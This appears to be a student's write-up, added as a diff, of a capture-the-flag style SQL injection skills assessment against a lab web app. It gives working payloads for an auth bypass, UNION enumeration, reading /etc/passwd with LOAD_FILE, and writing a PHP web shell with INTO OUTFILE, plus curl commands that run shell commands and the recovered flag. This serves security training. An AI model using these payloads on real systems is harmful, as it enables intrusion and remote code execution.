@@ -3,5 +3,39 @@ The company Inlanefreight has contracted you to perform a web application assess
 
 They provided a target IP address and no further information about their website. Perform a full assessment of the web application from a "grey box" approach, checking for the existence of SQL injection vulnerabilities.
 
-Question 1 - Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.
-1) 
+Question 1 - Assess the web application and use a variety of techniques to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer. - 528d6d9cedc2c7aab146ef226e918396 
+1) http://94.237.63.90:48381
+2) we are faced with a log on sceren so we will use what we learned from the section for an auth bypass 
+3) admin' OR '1' = '1' -- -
+4) logged on. we see a payroll info table and a search bar in top right corner, we will try to use sqli and check privs
+5) i put a single ' into the search form
+6) output: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1
+7) so we know its vulnerable. 
+8) now we will use UNION and see how many columns are present so we know how to shape queries: 
+' UNION SELECT 1,2,3,4,5 -- -
+9) output
+Adam 	January 	1337$ 	5%
+James 	March 	1213$ 	8%
+2 	      3 	   4 	     5
+10) we now know there are 5 columns, now lets see what user we are so we know how to check privs
+11) in the above query replace 2 with user()  so ->  ' UNION SELECT 1,user(),3,4,5 -- -
+output: root@localhost 
+12) now that we know our user lets check the privileges -> ' UNION SELECT 1, grantee, privilege_type, is_grantable, 5 FROM information_schema.user_privileges -- -
+13) once we see the privs we can just quickly confirm with a load file injection to readd /etc/passwd -> ' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4, 5-- -      -> again this is in the second column 
+14)  the one we truly care about is can we write to the backend server which is -> secure_file_priv 
+15) to check lets run this -> ' UNION SELECT 1, variable_name, variable_value, 4, 5 FROM information_schema.global_variables WHERE variable_name="secure_file_priv" -- -
+we see the output is empty which means we can write to backend.
+16) we must write this web shell to /html/www/html/dashboard -> this is because the page we are injecting on is http:/SERVERIP:PORT/dashboard/dashboard.php
+17) ' UNION SELECT "",'<?php system($_REQUEST["cmd"]); ?>', "", "", "" INTO OUTFILE '/var/www/html/dashboard/shell.php'-- -+
+18) the output should be blank then we can try to curl it -> curl -w "\n" -s http://94.237.63.90:48381/dashboard/shell.php?cmd=ls+/ | sed -e '1,2d' 
+19) output: 	bin
+boot
+dev
+etc
+flag_cae1dadcd174.txt
+home
+lib
+lib32
+
+20) curl -w "\n" -s http://94.237.63.90:48381/dashboard/shell.php?cmd=cat+/flag_cae1dadcd174.txt | sed -e '1,2d'
+21) output: 528d6d9cedc2c7aab146ef226e918396
